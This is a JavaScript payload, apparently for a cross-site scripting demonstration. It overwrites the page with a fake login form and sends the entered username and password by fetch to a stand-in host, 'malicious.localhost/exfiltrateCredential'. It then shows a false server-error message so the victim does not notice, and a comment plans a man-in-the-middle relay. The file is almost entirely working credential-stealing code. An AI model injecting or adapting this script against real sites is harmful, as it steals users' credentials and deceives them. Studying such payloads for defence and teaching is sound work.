/*
window.addEventListener("load", function() {
  alert("Pwned!");
});
*/

// Simulate original website's login page
const html = `
<!DOCTYPE html>
<html>
  <head>
    <title>Login</title>
    <style>
      .center {
        margin-top: 80px;
        margin: 0 auto;
        text-align: center;
      }
      h1 {
        text-align:center;
        color:rgb(0, 149, 255);
      }
    </style>
  </head>
  <body>
    <h2 style="text-align:center; color: orange;">Simulate original vulnerable site's Login page</h2>
    <!--form id="login-form" action="https://malicious.localhost/exfiltrateCredential" method="post"-->
    <div class="center">
      <form id="login-form">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
        <br>
        <br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <br>
        <br>
        <button type="submit">Login</button>
      </form>
    </div>
    <div id="error-message" class="center"></div>
  </body>
</html>
`;

// Write the HTML to the page
document.write(html);

// Select the form element
var form = document.querySelector('#login-form');

// Add an event listener for the form submit event. Prevent the default form submission behavior
form.addEventListener('submit', async (event) => {
  event.preventDefault();
  
  var formData = new URLSearchParams(new FormData(form));

  // Send to our malicious server.
  var response = await fetch('https://malicious.localhost/exfiltrateCredential', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: formData
  });
  
  

  // Handle the server response.  
  // To do: To perform MITM rely, pass response,cookie,redirect address back to victim.  
  if (response.status === 204) {
    // malicious server successfully saved exfiltrated credential, show an error message to user.
    var errorMessage = document.getElementById('error-message');
    errorMessage.innerHTML = "Server Error 500: Internal server error occur. Please come back later.";
    errorMessage.style.color = "red";

    //window.location.href = 'vulDemo/.html';
    } 
    else {
      // Handle other status codes here, such as 400 or 500.
      const errorMessage = document.querySelector('#error-message');
      errorMessage.textContent = result.message;
    }

});